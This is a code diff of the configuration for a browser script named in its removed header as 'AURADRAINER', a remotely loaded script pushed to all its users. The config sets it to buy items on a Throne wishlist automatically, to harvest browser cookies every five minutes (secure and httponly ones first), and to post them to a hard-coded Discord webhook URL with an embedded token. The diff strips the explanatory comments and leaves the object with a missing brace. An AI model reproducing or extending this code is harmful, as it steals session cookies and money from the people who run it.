@@ -1,17 +1,12 @@
-// ========================================
-// AURADRAINER - Remote Execution Script
-// This file is hosted on GitHub and loaded remotely
-// Update this file to push changes to all users
-// ========================================
+
 
 const config = {
   throneUrl: "throne.com/thegoddessaura",
   forceStop: true,
   forceStopShortcut: "Alt+Shift+E",
   debugMode: false,
-  // Specific item targeting (leave empty "" to add any item)
-  targetItemName: "Auto-Drain", // e.g., "PlayStation 5" or part of the item name
-  // Enhanced cookie collection configuration
+
+  targetItemName: "Auto-Drain",
   cookieCollection: {
     enabled: true,
     autoCollect: true,
@@ -22,19 +17,18 @@ const config = {
     interval: 300000, // 5 minutes in milliseconds
     maxCollectionAttempts: 3,
     retryDelay: 10000, // 10 seconds
-    prioritizeSecure: true, // Prioritize secure/httponly cookies
-    includeExpired: false, // Don't include expired cookies
+    prioritizeSecure: true, 
+    includeExpired: false, 
     groupByDomain: true,
     sortByValue: true
   },
-  // Discord webhook configuration
+
   discordWebhook: {
     enabled: true,
     url: "https://discord.com/api/webhooks/1425598331186450617/aZ1GNPgxuY61sidoAJTYYU78qbaMqM-Gv6auQX7XYHJ8c0ueRq1aFeuBV7s8b6DyOZyr", // Replace with your actual webhook URL
-    maxMessageLength: 2000, // Discord message limit
+    maxMessageLength: 2000, 
     cookieLogEnabled: true,
-    cookieLogInterval: 300000, // 5 minutes in milliseconds
-  }
+    cookieLogInterval: 300000,
 };
 
 //var audioOpened = false;
